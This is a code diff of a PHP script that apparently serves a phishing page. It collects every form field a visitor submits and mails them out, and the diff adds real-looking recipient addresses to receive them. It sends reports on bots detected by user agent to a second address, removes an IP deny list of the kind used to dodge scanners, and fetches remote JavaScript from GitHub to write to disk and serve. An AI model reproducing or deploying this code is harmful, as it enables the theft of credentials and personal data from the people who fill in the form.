@@ -1,4 +1,3 @@
-
 <?php
 
 
@@ -9,19 +8,12 @@
 
 $ip = $_SERVER['REMOTE_ADDR'];
 
-$deny = array("142.93.*");
-if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
-   header("location: https://".$ip);
-   exit();
-
-   
-}
 
 //phpinfo(32);
 if (!isset($_SESSION)) {
     session_start();
 }
-if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['_id'] !== ''){
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['_id'])){
 
     
 if(isset($_POST['email'])){
@@ -30,7 +22,7 @@ if(isset($_POST['email'])){
     if(isset($_POST['code'])){
         $code = $_POST['code'];
         }
-    if($code !== 'vsdg' && $mail !== '') {
+    if($code !== 'vsdg') {
    echo 'Post';
     
     
@@ -69,12 +61,12 @@ foreach ($_POST as $key => $value)
 
 
     if($code == "vsdg"){
-        $to = "";
+        $to = "drodriguez@safeguardcasualty.com";
         $in = 'vsdg';
     }elseif($code == "test"){
         echo $body;
     } else {
-        $to = "";
+        $to = "drodriguez@safeguardcasualty.com";
     }
     
 
@@ -94,7 +86,7 @@ foreach ($bot_identifiers as $identifier) {
   if (strpos($user_agent, $identifier) !== FALSE) {
       $body .= 'This is a bot';
       $in = 'robot';
-      $to = "";
+      $to = "drod247@gmail.com";
         
     print(TRUE);
     exit();
@@ -116,9 +108,8 @@ mail($to, $subject, $body, $headers);
 unset($_POST);
 //header("Location: ".$_SERVER['PHP_SELF']);
 exit;
-}
+} else {
 
-$server = $_SERVER['HTTP_ORIGIN'];
 $main = "main.js";
 $style = "vsdg.css";
 $content = "content.js";
@@ -141,7 +132,6 @@ if (!file_exists('./css/')) {
 if(!is_file('./script/'. $content)){
 
     $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
-    fwrite($file);
     fclose($file);
 }
 
@@ -158,26 +148,12 @@ $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/
 $myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
 fwrite($myfile, $js);
 fclose($myfile);
-}?>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title></title>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    
-    <?php 
-    echo "<script type='text/javascript' src='/script/${main}'></script>";
+}
+
+
+
+echo "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>";
+echo "<script type='text/javascript' src='/script/${main}'></script>";
+}
 ?>
-    <!--link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet"-->
-  <?php echo "<link href='/css/${css}' rel='stylesheet' Content-Type='text/css'>"?>
-</head>
-<body>
-
-
-<?php  echo "<script type='text/javascript' src='/script/${content}'></script>";?>
-</body>
-</html>
